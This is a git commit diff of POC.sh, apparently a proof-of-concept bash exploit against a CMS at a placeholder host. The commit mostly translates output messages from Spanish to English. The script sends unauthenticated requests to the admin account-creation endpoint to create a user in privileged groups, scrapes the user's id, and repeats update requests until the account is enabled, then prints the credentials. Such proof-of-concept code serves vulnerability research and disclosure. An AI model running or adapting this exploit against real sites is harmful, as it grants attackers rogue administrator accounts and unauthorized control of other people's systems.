05d28970159eab1758e3be0416b7d3310c4d0a3a
SebSecRepos <sebelettieri1@yahoo.com>
2023-10-10 15:03:28 -0300

    fix.sh

--- POC.sh
+++ POC.sh
@@ -1,3 +1,5 @@
+#!/bin/bash
+
 email='testing%40testing.com' # request email
 email2='testing@testing.com' #Grepeable email
 name='testing'
@@ -8,15 +10,15 @@ url="http://cmsurl/?uri=admin/accounts/create"
 
 data="emailAddress=$email&verifiedEmail=verified&username=$name&newPassword=$password&confirmPassword=$password&userGroups%5B%5D=34&userGroups%5B%5D=33&memo=&status=1&formAction=submit"
 
-
 curl -s -X POST $url -d $data &>/dev/null
 
-sleep 2
 
 id=$(curl -s -X GET "http://cmsurl/?uri=admin/accounts/list" | grep -B 1 "$email2" | head -n 1 | awk '{print $1}' | sed 's/<td>//g' | sed 's/<\/td>//g' | tr -d '[:space:]')
 
 sleep 2
 
+
+#Update created user many times until it is enabled
 for i in $(seq 0 100); do
     url1="http://cmsurl/?uri=admin/accounts/update&id=$id"
     data1="emailAddress=$email&verifiedEmail=verified&username=$name&newPassword=$password&confirmPassword=$password&userGroups%5B%5D=34&userGroups%5B%5D=33&memo=&status=1&formAction=submit&id=$id"
@@ -27,7 +29,7 @@ done
 
 ) > /dev/null 
 
-echo "Usuario privilegiado creado"
-echo "Nombre: $name"
+echo "Privileged user created web server"
+echo "Name: $name"
 echo "Email: $email2"
-echo "Contraseña: $password"
+echo "Password: $password"
